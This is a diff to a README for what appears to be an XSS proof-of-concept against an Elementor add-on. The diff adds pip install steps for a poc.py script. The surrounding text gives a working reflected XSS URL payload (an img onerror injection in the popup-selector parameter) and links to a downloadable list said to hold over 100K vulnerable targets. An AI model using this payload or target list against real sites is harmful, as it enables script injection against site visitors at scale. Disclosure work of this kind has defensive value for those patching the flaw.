@@ -1,10 +1,17 @@
 Please do not harm sites, FIX it ASAP
 targets vulnerable 100K+ probably affecting for XSS https://nt.ls/AkTE9 (can download by one click all vulnerable)
 
+##### Requirement to run poc.py, Install -
+
+```pip install selenium webdriver-manager```
+
+
 ![image](https://github.com/user-attachments/assets/4167280d-787d-45cd-81eb-4a5c25368885)
 
 #### manual POC elementor XSS 2025
  ==> ```https://target.com/?popup-selector=<img_src=x_onerror=alert("chirag")>&eael-lostpassword=1```
+
+ 
 ![image](https://github.com/user-attachments/assets/50d75f05-1392-4acf-9889-525e54ca5128)
 
 
